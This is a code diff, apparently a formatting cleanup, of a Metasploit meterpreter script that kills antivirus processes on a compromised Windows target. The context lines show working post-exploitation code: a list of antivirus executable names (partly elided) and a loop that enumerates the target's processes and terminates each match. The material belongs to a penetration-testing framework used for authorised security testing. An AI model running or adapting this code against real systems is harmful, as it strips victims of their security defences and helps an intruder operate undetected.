@@ -1,10 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
-
 
 #
 # Meterpreter script that kills all Antivirus processes
@@ -12,23 +11,23 @@
 #
 
 @@exec_opts = Rex::Parser::Arguments.new(
-  "-h"  => [ false, "Help menu." ]
+  "-h" => [ false, "Help menu." ]
 )
 def usage
   print_line("Usage:" + @@exec_opts.usage)
   raise Rex::Script::Completed
 end
 
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, _val|
   case opt
   when "-h"
     usage
   end
-}
+end
 
 print_status("Killing Antivirus services on the target...")
 
-avs = %W{
+avs = %w(
   AAWTray.exe
   Ad-Aware.exe
   MSASCui.exe
@@ -609,10 +608,10 @@ avs = %W{
   zatutor.exe
   zonalm2601.exe
   zonealarm.exe
-}
+)
 
-client.sys.process.get_processes().each do |x|
-  if (avs.index(x['name'].downcase))
+client.sys.process.get_processes.each do |x|
+  if avs.index(x['name'].downcase)
     print_status("Killing off #{x['name']}...")
     client.sys.process.kill(x['pid'])
   end
